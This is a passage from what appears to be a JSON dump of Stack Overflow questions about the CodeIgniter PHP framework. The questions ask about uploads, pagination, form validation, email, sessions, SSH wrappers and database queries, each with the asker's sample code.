\"./uploads/\".$filename;\n        $config['create_thumb'] = TRUE;\n        $config['maintain_ratio'] = TRUE;\n        $config['width']         = 128;\n        $config['height']       = 128;\n\n        /* Load \"image manipulation library\", see CodeIgniter user guide */\n        $this-&gt;load-&gt;library('image_lib', $config);\n\n        /* Resize the image! */\n        $this-&gt;image_lib-&gt;resize();\n\n        /* Assign upload_data to $data variable */\n        $data['upload_data'] = $this-&gt;upload-&gt;data();\n\n        /* Assign profile_data to $data variable */\n        $data['profile_data'] = $profile_data;\n\n        /* Runs the users model (update_photo function, see below) and ...\n        ... loads the location of the photo new photo into user's profile */\n        $this-&gt;foo-&gt;update_photo($user_id, $filename, $thumb);\n\n        /* Load \"success\" view with all the data! */\n        $this-&gt;load-&gt;view('upload_success', $data);\n        }\n  }\n}\n</code></pre>\n\n<p>All the other files are exactly the same as in the tutorial (except i have changed the url to the proper value for my server).</p>\n\n<p>Here is one issue I am having. I simply want to show the upload_form to allow a user to do that after they have logged in. So here is my welcome.php controller:</p>\n\n<pre><code>&lt;?php if (!defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Welcome extends CI_Controller\n{\n        function __construct()\n        {\n                parent::__construct();\n\n                $this-&gt;load-&gt;helper('url');\n                $this-&gt;load-&gt;library('tank_auth');\n        }\n\n        function index()\n        {\n                if (!$this-&gt;tank_auth-&gt;is_logged_in()) {\n                        redirect('/auth/login/');\n                } else {\n                        $data['user_id']        = $this-&gt;tank_auth-&gt;get_user_id();\n                        $data['username']       = $this-&gt;tank_auth-&gt;get_username();\n                        $this-&gt;load-&gt;view('welcome', $data);\n                        $this-&gt;load-&gt;view('upload_form');\n                }\n        }\n}\n\n/* End of file welcome.php */\n/* Location: ./application/controllers/welcome.php */\n</code></pre>\n\n<p>All this creates is a page that says Change profile picture at the top and nothing else. Any help with this part? The upload_form.php for the view is as follows: </p>\n\n<pre><code>&lt;h1&gt;Change Profile Picture&lt;/h1&gt;\n&lt;?php echo form_open_multipart('profile/do_upload');?&gt;\n&lt;input type=\"file\" name=\"userfile\" size=\"20\" /&gt;\n&lt;input type=\"submit\" value=\"Upload New Picture\" /&gt;\n&lt;/form&gt;\n</code></pre>\n"},{"tags":["codeigniter","model","transactions"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12246666,"title":"Codeigniter one transaction with two model","body":"<p>Is it possible to have one \"transaction\" with to separate models. \nI want to insert a post with their tags. Tags and Posts are in two separate models.\nHow can i achive to handle it with a transaction? (Like below:)</p>\n\n<pre><code>$this-&gt;db-&gt;trans_start();\n$this-&gt;post_model-&gt;insert('...');\n$this-&gt;tags_model-&gt;insert('...');\n$this-&gt;db-&gt;trans_complete();\n</code></pre>\n"},{"tags":["php","codeigniter","pagination"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":118,"score":0,"question_id":12241337,"title":"Codeigniter pagination on function index","body":"<p>I edited this after figuring out a few things but is this a good way if I want my links on index? Without the function page, it will not work correctly if the base_url is test/index, but test/test will work.</p>\n\n<p>controller</p>\n\n<p>class Test extends CI_Controller {</p>\n\n<pre><code>public function __construct()\n{\n    parent::__construct();\n    $this-&gt;load-&gt;model('Test_model');\n    $this-&gt;load-&gt;library('pagination');\n}\n\npublic function index()\n{\n    $page['title']  = '';\n    $page['file']   = 'test/index';\n\n    $config['base_url'] = base_url().'test/page';\n    $config['total_rows'] = $this-&gt;Test_model-&gt;record_count();\n    $config['per_page'] = 2;\n    $config['num_links'] = 5;\n\n    $offset = $this-&gt;uri-&gt;segment(3,0);\n\n    $this-&gt;pagination-&gt;initialize($config);\n\n    $page['data']['items'] = $this-&gt;Test_model-&gt;getItems($config['per_page'], $offset);\n    $page['data']['pagination'] = $this-&gt;pagination-&gt;create_links();\n    $this-&gt;load-&gt;view('template', $page);\n}\n\npublic function page()\n{\n    $page['title']  = '';\n    $page['file']   = 'test/index';\n\n    $config['base_url'] = base_url().'test/page';\n    $config['total_rows'] = $this-&gt;Test_model-&gt;record_count();\n    $config['per_page'] = 2;\n    $config['num_links'] = 5;\n\n    $offset = $this-&gt;uri-&gt;segment(3,0); \n\n    $this-&gt;pagination-&gt;initialize($config);\n\n    $page['data']['items'] = $this-&gt;Test_model-&gt;getItems($config['per_page'], $offset);\n    $page['data']['pagination'] = $this-&gt;pagination-&gt;create_links();\n    $this-&gt;load-&gt;view('template', $page);\n}\n</code></pre>\n\n<p>}</p>\n\n<p>model</p>\n\n<pre><code>public function record_count()\n{\n    return $this-&gt;db-&gt;count_all('item');\n}\n\npublic function getItems($limit, $offset)\n{\n    $query = $this-&gt;db-&gt;get('item', $limit, $offset);\n    $result = $query-&gt;result();\n    return $result;\n}\n</code></pre>\n\n<p>view</p>\n\n<pre><code>&lt;h2&gt;&lt;?=$pagination; ?&gt;&lt;/h2&gt;\n&lt;table&gt;\n&lt;?php foreach($items as $item) { ?&gt;\n\n&lt;tr&gt;&lt;td&gt;&lt;?=$item-&gt;name?&gt;&lt;/td&gt;&lt;/tr&gt;\n\n&lt;?php } ?&gt;\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12236604,"title":"CI active navigation item","body":"<p>In a site navigation bar, I have some logic that determines which page the user is currently viewing, and gives that menu-item an <code>.active</code> class.</p>\n\n<p>The code I came up with does work, though it doesn't feel very elegant. Can you think of a way to do this better? How could I move the logic out of the view and into the controller? How can I stop repeating myself?</p>\n\n<p><strong>The controller:</strong></p>\n\n<pre><code>&lt;?php\n\nclass Pages extends CI_Controller {\n\n    public function view ($page = 'home') {\n\n        if (!file_exists('application/views/pages/'.$page.'.php'))\n            show_404();\n\n        $data['active'] = $page;\n\n        $this-&gt;load-&gt;view('templates/header', $data);\n        $this-&gt;load-&gt;view('pages/'.$page, $data);\n        $this-&gt;load-&gt;view('templates/footer', $data);\n\n    }\n}\n\n?&gt;\n</code></pre>\n\n<p><strong>The view:</strong></p>\n\n<pre><code>&lt;ul class=\"nav\"&gt;\n    &lt;li class=\"&lt;?php echo($active=='home')?'active':''; ?&gt;\"&gt;&lt;a href=\"./\"&gt;blog&lt;/a&gt;&lt;/li&gt;\n    &lt;li class=\"&lt;?php echo($active=='about')?'active':''; ?&gt;\"&gt;&lt;a href=\"about\"&gt;about&lt;/a&gt;&lt;/li&gt;\n    &lt;li class=\"&lt;?php echo($active=='projects')?'active':''; ?&gt;\"&gt;&lt;a href=\"projects\"&gt;projects&lt;/a&gt;&lt;/li&gt;\n    &lt;li class=\"&lt;?php echo($active=='lab')?'active':''; ?&gt;\"&gt;&lt;a href=\"lab\"&gt;lab&lt;/a&gt;&lt;/li&gt;\n    &lt;li class=\"&lt;?php echo($active=='contact')?'active':''; ?&gt;\"&gt;&lt;a href=\"contact\"&gt;contact&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n</code></pre>\n"},{"tags":["php","html","forms","validation","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":92,"score":0,"question_id":12117812,"title":"Having trouble emailing radio button values in Codeigniter","body":"<p>I am attempting to email a form with radio button inside it, when I go to send the email. I get a returned value of just \"on\". I have set the name \"value\" correctly and tied it to form_validation code it all seems to \"work\" but the values are not being set correctly or emailed correctly. Code below.</p>\n\n<p>Controller file:</p>\n\n<p>public function contact_email()</p>\n\n<pre><code>{\n        $this-&gt;load-&gt;helper(array('form', 'url'));\n        $this-&gt;load-&gt;library('form_validation');\n        $this-&gt;load-&gt;library('email');\n\n        $this-&gt;form_validation-&gt;set_rules('name', 'Name', 'required|xss_clean');\n        $this-&gt;form_validation-&gt;set_rules('email', 'Email', 'required|valid_email|xss_clean');\n        $this-&gt;form_validation-&gt;set_rules('phone', 'Phone', 'is_numeric|xss_clean');\n        $this-&gt;form_validation-&gt;set_rules('comments', 'Comments', 'xss_clean');\n\n        if ($this-&gt;form_validation-&gt;run() == FALSE) {\n\n            $data[\"messages\"] = \"\";\n            $this-&gt;load-&gt;view('engage_header');\n            $this-&gt;load-&gt;view('engage_nav');\n            $this-&gt;load-&gt;view('contact/content_form', $data);\n            $this-&gt;load-&gt;view('engage_footer');\n\n        } else {\n\n            $data[\"messages\"] = \"The Email has successfully been sent\";\n\n            $this-&gt;email-&gt;from(set_value(\"email\"), set_value(\"name\"));\n            $this-&gt;email-&gt;to('test@test.com');\n\n             $this-&gt;email-&gt;subject('Contact Request');\n\n            $message  = \"Name: \" . $this-&gt;input-&gt;post('name') . \"\\n\";\n            $message .= \"Email: \" . $this-&gt;input-&gt;post('email') . \"\\n\";\n            $message .= \"phone: \" . $this-&gt;input-&gt;post('phone') . \"\\n\\n\";\n            $message .= \"Comments: \" . $this-&gt;input-&gt;post('comments') . \"\\n\";\n            $message .= \"Favorite Drink:\" . $this-&gt;input-&gt;post('drinks') . \"\\n\";\n\n            $this-&gt;email-&gt;message($message);  \n\n            $this-&gt;email-&gt;send();\n\n            echo $this-&gt;email-&gt;print_debugger();\n\n            $this-&gt;load-&gt;view('engage_header');\n            $this-&gt;load-&gt;view('engage_nav');\n            $this-&gt;load-&gt;view('contact/content_form', $data);\n            $this-&gt;load-&gt;view('engage_footer');\n        }   \n    }\n</code></pre>\n\n<p>View File</p>\n\n<pre><code>&lt;div class=\"form_wrapper\"&gt;\n        &lt;div class=\"head_left\"&gt;\n        &lt;p class=\"heading\"&gt;&lt;img src=\"/resources/css/images/mail_icon.png\" width=\"32px\" height=\"32px\" class=\"mail_icon\"&gt;Contact Us&lt;/p&gt;\n        &lt;/div&gt;\n        &lt;div class=\"borders\"&gt;&lt;/div&gt;\n\n        &lt;div class=\"form_container_left\"&gt;\n\n        &lt;?php echo form_open('/index.php/site/contact_email')?&gt;\n        &lt;label for=\"name\"&gt;Your Name:&lt;/label&gt;\n        &lt;input type=\"text\" name=\"name\" id=\"name\" required/&gt;\n        &lt;br/&gt;\n        &lt;br/&gt;\n        &lt;br/&gt;\n        &lt;label for=\"email\"&gt;Email:&lt;/label&gt;\n        &lt;input type=\"text\" name=\"email\" id=\"email\" required/&gt;\n        &lt;br/&gt;\n        &lt;br/&gt;\n        &lt;br/&gt;\n        &lt;label for=\"phone\"&gt;Phone:&lt;/label&gt;\n        &lt;input type=\"text\" name=\"phone\" id=\"phone\"/&gt;\n        &lt;br/&gt;\n        &lt;br/&gt;\n        &lt;br/&gt;\n        &lt;label for=\"messages\"&gt;How Can We Help?:&lt;/label&gt;\n        &lt;textarea rows=\"\" cols=\"\" id=\"messages\" name=\"comments\"&gt;&lt;/textarea&gt;\n        &lt;br/&gt;\n        &lt;br/&gt;\n        &lt;br/&gt;\n        &lt;input type=\"reset\" name=\"Reset\" id=\"reset_bar\"&gt;\n        &lt;input type=\"submit\" name=\"Submit\" id=\"submit_bar\" value=\"Submit\"&gt; \n\n\n        &lt;/div&gt;\n        &lt;div class=\"form_container_right\"&gt;\n            &lt;p  class=\"optional_heading\"&gt;Your Favorite Drink (optional):&lt;/p&gt;\n            &lt;div class=\"soda_container\"&gt;\n            &lt;img src=\"/resources/css/images/Soda.png\" width=\"64px\" height=\"64px\"&gt;\n            &lt;center&gt;&lt;p id=\"soda_text\"&gt;Soda&lt;/p&gt;&lt;/center&gt;\n            &lt;br/&gt;\n            &lt;center&gt;&lt;input type=\"radio\" name=\"drinks\" id=\"soda\" value=\"soda\"&gt;&lt;/center&gt;\n            &lt;/div&gt;\n            &lt;div class=\"coffee_container\"&gt;\n            &lt;img src=\"/resources/css/images/coffee.png\" width=\"64px\" height=\"64px\"&gt;\n            &lt;center&gt;&lt;p id=\"coffee_text\"&gt;Coffee&lt;/p&gt;&lt;/center&gt;\n            &lt;br/&gt;\n            &lt;center&gt;&lt;input type=\"radio\" name=\"drinks\" id=\"coffee\" value=\"coffee\"&gt;&lt;/center&gt;\n            &lt;/div&gt;\n            &lt;div class=\"water_container\"&gt;\n            &lt;img src=\"/resources/css/images/water.png\" width=\"64px\" height=\"64px\"&gt;\n            &lt;center&gt;&lt;p id=\"water_text\"&gt;Water&lt;/p&gt;&lt;/center&gt;\n            &lt;br/&gt;\n            &lt;center&gt;&lt;input type=\"radio\" name=\"drinks\" id=\"water\" value=\"water\"&gt;&lt;/center&gt;\n            &lt;/div&gt;\n            &lt;div class=\"beer_container\"&gt;\n            &lt;img src=\"/resources/css/images/beer.png\" width=\"64px\" height=\"64px\"&gt;\n            &lt;center&gt;&lt;p id=\"beer_text\"&gt;Beer&lt;/p&gt;&lt;/center&gt;\n            &lt;br/&gt;\n            &lt;center&gt;&lt;input type=\"radio\" name=\"drinks\" id=\"beer\" value=\"beer\"&gt;&lt;/center&gt;\n            &lt;/div&gt;\n            &lt;div class=\"wine_container\"&gt;\n            &lt;img src=\"/resources/css/images/wine.png\" width=\"64px\" height=\"64px\"&gt;\n            &lt;center&gt;&lt;p id=\"wine_text\"&gt;Wine&lt;/p&gt;&lt;/center&gt;\n            &lt;br/&gt;\n            &lt;center&gt;&lt;input type=\"radio\" name=\"drinks\" id=\"wine\" value=\"wine\"&gt;&lt;/center&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;  \n        &lt;?php echo form_close()?&gt;\n</code></pre>\n"},{"tags":["codeigniter","session","web-crawler","robots"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":80,"score":1,"question_id":12241701,"title":"How to prevent bots from creating sessions in CodeIgniter?","body":"<p>I am using CodeIgniter with sessions stored in my database.\nOver a short period of time, a large amount of sessions are created by bots/spiders, etc.</p>\n\n<p>Is there a way of preventing this? Perhaps via .htaccess?</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":106,"score":0,"question_id":12222305,"title":"Fatal error: Cannot redeclare class Net_SSH2 in /var/www/phpseclib/Net/SSH2.php on line 194","body":"<p>I have created a CI model that dynamically loads certain classes depending on a parameter that is passed in.  These classes are just wrapper classes around phpseclib to make ssh connections to different devices. \nWhat I'm noticing is that when I try to execute one particular method, I'm getting the above error message. </p>\n\n<p>Here's some sample code to help you understand what I'm doing.  This is what my model looks like: </p>\n\n<pre><code>    public function get_portstatusall($ip, $switchname)\n    {           \n        $classname = $this-&gt;switchToClassName($switchname);\n        try{\n        include_once(APPPATH.'libraries/'.$classname.'.php');                 \n        $switch_obj = new $classname($ip, 'password', '');\n        $switch_obj-&gt;connect();\n        $data = $switch_obj-&gt;dosomething(); \n        $switch_obj-&gt;disconnect();  \n        return $data;\n        }\n         catch (Exception $e) {\n            echo 'this really should be logged...';\n            return false;\n         }\n    }   \n\n            public function get_portstatusindividual($ip, $switchname)\n            {           \n                 $classname = $this-&gt;switchToClassName($switchname);\n                 try{\n\n                     include_once(APPPATH.'libraries/'.$classname.'.php'); \n         $switch_obj = new $classname($ip, 'password', '');\n         $switch_obj-&gt;connect();\n         $data = $switch_obj-&gt;dosomethingelse();    \n         $switch_obj-&gt;disconnect();  \n         return $data;\n         }\n         catch (Exception $e) {\n            echo 'this really should be logged...';\n            return false;\n         }\n               }\n</code></pre>\n\n<p>As you can see, i'm dynamically determining which class to load depending on the switchname that is passed in. This code successfully loads a class called \"device123.php\", let's say. Class device123 in turn, instantiates the SSH2 object that comes with the phpseclib, and uses it to send ssh commands to the device.</p>\n\n<p>Here's a clip of code from device 123: </p>\n\n<p>\n\n<pre><code>class device123\n{\n// sample code to demo how to use phpseclib to create an interactive ssh session.\n//this library relies on phpseclib.  you must include this class and SSH2.php from Net/phpseclib.\n\n\nprivate $_hostname;\nprivate $_password;\nprivate $_username;\nprivate $_connection;\nprivate $_data;\nprivate $_timeout;\nprivate $_prompt;\n\npublic function __construct($hostname, $password, $username = \"\", $timeout = 10) \n//public function __construct($params) \n{\n    echo 'in the switch constructor&lt;br&gt;';\n    set_include_path(get_include_path() . PATH_SEPARATOR . '/var/www/phpseclib');\n    include('Net/SSH2.php');\n\n   $this-&gt;_hostname = $hostname;\n    $this-&gt;_password = $password;\n    $this-&gt;_username = $username;\n\n} // __construct\n\npublic function connect() \n{\n    $ssh = new Net_SSH2($this-&gt;_hostname); \n    if (!$ssh-&gt;login($this-&gt;_username, $this-&gt;_password)) { //if you can't log on...\n    die(\"Error: Authentication Failed for $this-&gt;_hostname\\n\");\n    }\n    else  {\n\n    $output= $ssh-&gt;write(\"\\n\"); //press any key to continue prompt;\n    $prompt=$ssh-&gt;read('/([0-9A-Z\\-])*(#)(\\s*)/i', NET_SSH2_READ_REGEX); \n    if (!$prompt) {\n        die(\"Error: Problem connecting for $this-&gt;_hostname\\n\");\n    }  \n    else {\n\n        $this-&gt;_connection = $ssh;\n    }\n\n    }\n} // connect\n\n\npublic function close() \n{\n    $this-&gt;_send('exit');\n} // close\n\npublic function disconnect()\n{\n  $this-&gt;_connection-&gt;disconnect();\n  $ssh=NULL;\n}\n</code></pre>\n\n<p>I don't think I quite understand how I can be redeclaring the SSH2 class... but i wanted to see if perhaps I was not destroying / cleaning up after myself properly. \nTo help troubleshoot, I've tried adding debug echo statements in the constructor and destructor of both the SSH2 class, and also the wrapper class called device123.\nIt all looks proper...</p>\n\n<p>I don't think I'm on the right track... Can you tell me where you think I should start looking? \nIs it because it's possible that both methods are called ... one after the other... and both can possibly load the same class? </p>\n\n<p>Thanks. </p>\n"},{"tags":["codeigniter","iis7"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":101,"score":2,"question_id":12246073,"title":"Codeigniter 2 and IIS 7 error 500","body":"<p>I am trying to move a site from apache/linux to a server with windows and IIS7. \nUnfortunatelly when i try to enter the site it gives me </p>\n\n<blockquote>\n  <p>500 - Internal server error.\n  There is a problem with the resource you are looking for, and it cannot be displayed.</p>\n</blockquote>\n\n<p>I tracked down the line in code where it hangs and it is in /system/core/CodeIgniter.php here\nline 359 </p>\n\n<blockquote>\n  <p>call_user_func_array(array(&amp;$CI, $method), array_slice($URI->rsegments, 2));</p>\n</blockquote>\n\n<p>Any idea where to look to solve this?</p>\n\n<p>I should mention the fact that, the same codeigniter version, but with no custom code in it, works ok. So the problem is in my code, but the IIS dont show me any error and at this point I dont have access to any error log (if there is such thing on IIS).</p>\n"},{"tags":["security",".htaccess","codeigniter","robots"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12247040,"title":"How to restrict access to files in a folder in codeigniter","body":"<p>Hello I have used codeigniter to develop my website but when my website is searched in google , google shows up links to the files (pdf) in a particular folder and user can view these files (pdf) directly without login. I want to restrict google to directly show the links to these files. \nex: www.mywebsite/myfolder/myfile</p>\n\n<p>Please guide me how can I accomplish this. Thank you.</p>\n"},{"tags":["codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12244249,"title":"Assigning object data to a view in Codeigniter gives weird behaviour","body":"<p>I've got a problem when assigning data to an object variable. In all my time, i haven't seen such weird behaviour.</p>\n\n<p>I have a class:</p>\n\n<pre><code>class Main extends CI_Controller {\n\n    public $data = array();\n\n    public function __construct(){\n        parent::__construct();\n        /**\n         * Load Models\n         */\n        $this-&gt;load-&gt;model('rss');\n        $this-&gt;load-&gt;model('model_product');\n\n        /**\n         * Default loaded Data\n         */\n                $this-&gt;data['newsfeed'] = $this-&gt;rss-&gt;load($this-&gt;config-&gt;item('newsfeed'));\n        }\n}\n</code></pre>\n\n<p>You see that i want to add the newsfeed to the $this->data object. It will held in a key named newsfeed. But now, i want this newsfeed on different pages. It is useless and inefficient to load this on every page, so i extended my main controller.</p>\n\n<pre><code>class Shop extends Main {\n\n    public function __construct(){\n        parent::__construct();\n    }\n\n\n    public function index()\n    {\n        $this-&gt;data['content'] = 'shop/default';\n        $this-&gt;load-&gt;view('template/index', $this-&gt;data);\n    }\n\n    public function product($id){\n        $this-&gt;data['product'] = $this-&gt;model_product-&gt;getProducts(null, $id);\n\n        if($this-&gt;data['product']-&gt;categoryid != $this-&gt;config-&gt;item('gamecategory')){\n            redirect('');\n        }\n\n        var_dump($this-&gt;data['product']);\n\n        $this-&gt;data['content'] = 'shop/product';\n        $this-&gt;load-&gt;view('template/index', $this-&gt;data);\n    }\n}\n</code></pre>\n\n<p>The expected behaviour would be that $this->data would hold an array of objects (in each key ) but when i var_dump in the shop controller it gives me the entire $data object as return data, instead of the provided key. This totally blows my mind and i cant seem to understand this weird behaviour.</p>\n\n<pre><code>Expected var_dump ($this-&gt;data['product']):\n\nArray(x){\n key: value,\n key: value,\n .....\n}\n\nactual result:\n\nObject{\n     newsfeed:\n         - data\n     product:\n         - data\n     ....\n     ....\n}\n</code></pre>\n\n<p>Model rss:</p>\n\n<pre><code>if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\n    class Rss extends CI_Model{\n        public function __construct(){\n            parent::__construct();\n        }\n\n        public function load($item){\n            return ($xml = simplexml_load_string(file_get_contents($item))) ? $xml : false;\n        }\n    }\n</code></pre>\n"},{"tags":["php","sql","codeigniter","sql-update"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12239187,"title":"Codeigniter batch update raises error about index","body":"<p>The following code in codigniter gives me an error to update array:</p>\n\n<pre><code>$query=\"UPDATE sell_rate SET price='$price' WHERE code='$code'\";\n                $this-&gt;db-&gt;query($query);\n</code></pre>\n\n<p>The error is: </p>\n\n<blockquote>\n  <p>You must specify an index to match on for batch updates</p>\n</blockquote>\n\n<p>Please help me fixing this.</p>\n"},{"tags":["php","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":98,"score":0,"question_id":12243684,"title":"How can I generate the calendar for the year Jesus was born in?","body":"<p>I write </p>\n\n<pre><code>$this-&gt;calendar-&gt;generate(1,1)\n</code></pre>\n\n<p>to display a calendar, but it return as  2001, 1</p>\n\n<p>What am I missing?</p>\n"},{"tags":["php","database","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":105,"score":0,"question_id":12244840,"title":"How to display total comments","body":"<p>Whatsup codeigniters!\nI want to display total comments of my blog that I am building with codeigniter.\nIn my controller I have:</p>\n\n<pre><code>   function index() {\n\n          $data['query'] = $this-&gt;blog_model-&gt;get_all_entries();\n          $this-&gt;load-&gt;view('blog/index',$data);\n   }\n</code></pre>\n\n<p>Function index() gets all posts.\nand I have</p>\n\n<pre><code>  public function post($id) {\n          $data['query'] = $this-&gt;blog_model-&gt;get_post($id);\n          $data['comments'] = $this-&gt;blog_model-&gt;get_post_comment($id);\n          $data['post_id'] = $id;\n          $data['total_comments'] = $this-&gt;blog_model-&gt;total_comments($id);\n          $this-&gt;load-&gt;view('blog/index',$data,TRUE);\n\n          $this-&gt;load-&gt;helper('form');\n          $this-&gt;load-&gt;library(array('form_validation','session'));\n          //validation rules for post function\n\n          $this-&gt;form_validation-&gt;set_rules('commentor','Name','required');\n          $this-&gt;form_validation-&gt;set_rules('email','Your email','required|valid_email');\n          $this-&gt;form_validation-&gt;set_rules('comment','Comment','required');\n\n          if($this-&gt;blog_model-&gt;get_post($id))\n          {\n                 foreach($this-&gt;blog_model-&gt;get_post($id) as $row) \n                 {\n                        //set page title\n                        $data['title'] = $row-&gt;entry_name;\n                 }\n                 if($this-&gt;form_validation-&gt;run() == FALSE)\n                 {\n                        //if validation runs FALSE\n                        $this-&gt;load-&gt;view('blog/post',$data);\n                 }\n                 else\n                 {\n                        //if valid\n                        $name = $this-&gt;input-&gt;post('commentor');\n                        $email = strtolower($this-&gt;input-&gt;post('email'));\n                        $comment = $this-&gt;input-&gt;post('comment');\n                        $post_id = $id;\n\n                        $this-&gt;blog_model-&gt;add_new_comment($post_id,$name,$email,$comment);\n                        $this-&gt;session-&gt;set_flashdata('message', '1 new comment added!');\n                        redirect('blog/post/'.$id);\n                  }\n           }\n           else\n                  show_404();\n   }\n</code></pre>\n\n<p>Basically, post($id) gets a post with id (single post) and display comments. I can print total comments number in single post. But how do i print total comments number in index() function where all posts are listed. Thank you!</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12243593,"title":"How to include a file within the library into a page in codeigniter?","body":"<pre><code>I tried like \n$this-&gt;obj-&gt;load-&gt;library('phpmailer');\n$this-&gt;obj-&gt;load-&gt;library('phpmailer/class.phpmailer');\n</code></pre>\n\n<p>But it causes php error.Please suggest a solution.</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":174,"score":2,"question_id":7427593,"title":"Codeigniter if controller","body":"<p>First of all sorry if its a noob question.</p>\n\n<p>But is it posibble to do this in codeingiter, like if i have a sidebar but i only want to load it in 2 pages </p>\n\n<pre><code>if(controller == 'blog') {\n   //load sidebar\n}\n</code></pre>\n\n<p>just like in wordpress if is_page</p>\n"},{"tags":["mysql","database","query","codeigniter","remote-connection"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":89,"score":0,"question_id":11762214,"title":"Codeigniter remote connection does not return queries","body":"<p>I have a local and a remote connection with my mysql database. The local connection works just fine. But the remote connection, while it makes a connection, it does not return anything. I usually get the following:</p>\n\n<p>Fatal error: Call to a member function result() on a non-object </p>\n\n<p>I use for the remote connection the following configuration:</p>\n\n<pre><code>\n\n    $db['mydb']['hostname'] = \"ip_address_of_database\";\n    $db['mydb']['username'] = \"username\";\n    $db['mydb']['password'] = \"password\";\n    $db['mydb']['database'] = \"database\";\n    $db['mydb']['dbdriver'] = \"mysql\";\n    $db['mydb']['dbprefix'] = \"\";\n    $db['mydb']['pconnect'] = FALSE;\n    $db['mydb']['db_debug'] = FALSE;\n    $db['mydb']['cache_on'] = FALSE;\n    $db['mydb']['cachedir'] = \"\";\n    $db['mydb']['char_set'] = \"utf8\";\n    $db['mydb']['dbcollat'] = \"utf8_general_ci\";\n\n</code></pre>\n\n<p>In my function that accesses the database I check if there is a connection with the remote server and then I try to retrieve data. </p>\n\n<pre><code>\n\n    $mydb = $this->load->database('mydb', TRUE);\n    if (!isset($mydb->conn_id) && !is_resource($mydb->conn_id)) {\n        $error = 'database is not connected';\n        return $error;\n    }else{\n        $query = $mydb->query(\"SELECT * FROM database LIMIT 1;\"); \n        return $query->result();            \n         }\n\n</code></pre>\n\n<p>This works fine in the localhost database but not in the remote database. I allways get the error \nFatal error: Call to a member function result() on a non-object </p>\n\n<p>Can you please help? What am I doing wrong? I stuck on this.</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12244449,"title":"Codeigniter query Always returning TRUE","body":"<p>I got this piece of function that updates  an account with 1 or 0,<br>\nnote that the account_status has a data type of boolean.</p>\n\n<p>I understand that $this->db->query(); returns TRUE or FALSE in write queries,</p>\n\n<p>but i am having trouble, because when i tried to put a non boolean value on account_status, still the response is success, but obviously it will not update because the data is not boolean.</p>\n\n<pre><code>public function approve_account($id='0'){\n        if($id == '0' OR $id== ''){\n            return FALSE;\n        }else{\n            try{\n                $id = (int)htmlentities($id,ENT_COMPAT,'UTF-8');\n                $sql= \"UPDATE elibrary.elib_user_account e \n                       SET account_status = 'hg' \n                       WHERE t_user_id = ?\n                       LIMIT 1;\";\n\n                if($this-&gt;db-&gt;query($sql,$id) === TRUE){\n                    echo 'sucess';\n                }else{\n                    echo 'FAIL';\n                }\n            }catch(Exception $e){\n                echo $e;\n            }\n        }\n    }\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12241332,"title":"set_value() Does Not Maintain the Field's Value","body":"<p><strong>Set value does not maintain the field value when i get validation errors.</strong></p>\n\n<p><em><strong></em>*View*</strong>:**</p>\n\n<pre><code>echo form_input('post_title', set_value('post_title')); \n</code></pre>\n\n<p><strong>Controller:</strong></p>\n\n<pre><code>if ($this-&gt;form_validation-&gt;run('post_ad') == FALSE)\n{\n    set_temporary_msg(validation_errors('&lt;div&gt;', '&lt;/div&gt;'));  \n}\n</code></pre>\n\n<p><strong>Helper:</strong></p>\n\n<pre><code>function set_temporary_msg($msg, $target_location = '') \n{\n    $CI =&amp; get_instance();\n    $CI-&gt;session-&gt;set_flashdata('temp_msg', $msg);\n    redirect($target_location); \n}\n\nfunction get_temporary_msg() {\n\n    $CI =&amp; get_instance();\n    echo $CI-&gt;session-&gt;flashdata('temp_msg');\n\n}\n</code></pre>\n\n<p>If some input are invalid, set_temporary_msg() is called.\nAt the top of the <strong><em>View</em></strong> page, i echo get_temporary_msg();</p>\n\n<p><strong>Error messages and redirection work fine, but i lose all set_value(). Any idea how to solve this issue?</strong></p>\n"},{"tags":["php","forms","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":116,"score":1,"question_id":12235255,"title":"Codeigniter Form Validation always returns false","body":"<p>I've spent so much time on this one I think I've gone code-blind. The form validation is always returning FALSE on run and I can't figure out the reason.</p>\n\n<p>The new_map() function displays first the form, on submit of the form (with value set in the map_name field of course), the form validation run returns false and the form is reset with no errors displayed however. What am I missing??</p>\n\n<p>Controller:</p>\n\n<pre><code>public function new_map()\n{\n    $data['extra_assets']['js'][] = 'app/admin/maps.js';\n\n    $data['title'] = 'Add Map';\n\n    $this-&gt;form_validation-&gt;set_rules('map_name', 'Map name', 'required');\n\n    if ($this-&gt;form_validation-&gt;run() == FALSE)\n    {  \n        $this-&gt;load_admin_view('admin/ae_map', $data);\n    }\n    else\n    {\n        